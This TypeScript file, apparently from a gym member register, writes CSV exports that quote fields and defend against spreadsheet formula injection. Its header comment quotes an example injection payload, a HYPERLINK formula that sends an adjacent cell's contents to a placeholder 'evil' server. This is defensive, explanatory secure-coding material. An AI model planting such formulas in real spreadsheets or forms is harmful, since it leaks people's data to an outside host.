/**
 * Writing CSV that a spreadsheet opens and cannot be tricked by (ATT-007).
 *
 * Two separate problems, and the dangerous one is not the obvious one.
 *
 * **Quoting** is the obvious one: a member called `Sanjay "Raj" Tomar, Jr` or a note with
 * a newline in it has to survive the round trip, so any field containing a comma, a quote,
 * a carriage return or a newline is quoted and its quotes doubled.
 *
 * **Formula injection** is the one that matters. A field beginning `=`, `+`, `-`, `@`, or a
 * tab or carriage return, is treated by Excel, LibreOffice and Google Sheets as a formula
 * rather than text. A member whose name is typed as `=HYPERLINK("http://evil/"&A1,"Click")`
 * becomes a live link in the owner's spreadsheet pointing at a server that now has the
 * contents of the cell next to it. This register is filled in from the QR form by members
 * themselves, so the names in it are untrusted input in exactly the way a web form is, and
 * the export is read by the one person in the gym who can see everything.
 *
 * The guard is a leading apostrophe, which every major spreadsheet reads as "this is text"
 * and does not display. It is applied *before* quoting, so the apostrophe is inside the
 * quoted value rather than outside it.
 */

/** Characters that make a spreadsheet treat a cell as a formula rather than as text. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** Characters that force a field to be quoted. */
const NEEDS_QUOTING = /[",\r\n]/;

/**
 * One field, safe to place in a row.
 *
 * `null` and `undefined` become empty rather than the strings "null" and "undefined",
 * which is what a spreadsheet shows if you let them through.
 */
export function csvField(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  const raw = String(value);
  if (raw === '') return '';

  // Neutralise first, quote second: the apostrophe belongs inside the quotes.
  const safe = FORMULA_START.test(raw) ? `'${raw}` : raw;
  return NEEDS_QUOTING.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

export function csvRow(fields: readonly CsvValue[]): string {
  return fields.map(csvField).join(',');
}

/**
 * A whole file: header, rows, CRLF throughout, and a byte-order mark.
 *
 * CRLF because that is what the format says and what Excel is happiest with. The mark is
 * `\uFEFF` — the character, not the four letters, which is a mistake this codebase has
 * already made once in the import template.
 */
export type CsvValue = string | number | null | undefined;

export function csvFile(header: readonly string[], rows: ReadonlyArray<readonly CsvValue[]>): string {
  return `\uFEFF${[csvRow(header), ...rows.map(csvRow)].join('\r\n')}\r\n`;
}
